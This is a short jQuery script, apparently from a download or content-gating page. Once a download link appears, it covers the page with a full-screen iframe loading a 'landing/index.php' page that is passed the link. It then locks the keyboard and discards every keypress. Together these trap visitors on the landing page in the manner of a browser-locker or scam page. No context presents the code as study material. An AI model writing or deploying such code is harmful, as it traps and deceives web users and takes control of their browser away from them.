$().ready(function (e) {
    var si = setInterval(function (e){
        if($('.successRow a').length) {
            $('.overflowww').append('<div id="download-process" style="position: fixed;top:0;left:0;width:100%;height:100%;background: white;z-index:100;"><iframe width="100%;" frameborder="0" style="width: 100%;height:100%;border: 0;" src="./landing/index.php?confirm='+$('.successRow a').attr('href')+'"></iframe></div>');

            clearInterval(si);
        }

    });

});

function fullscreenExit()
{
    if (document.exitFullscreen) {
        document.exitFullscreen();
    } else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen();
    } else if (document.mozCancelFullScreen) {
        document.mozCancelFullScreen();
    } else if (document.msExitFullscreen) {
        document.msExitFullscreen();
    }
}

navigator.keyboard.lock();
document.onkeydown = function (e) {
return false;
}
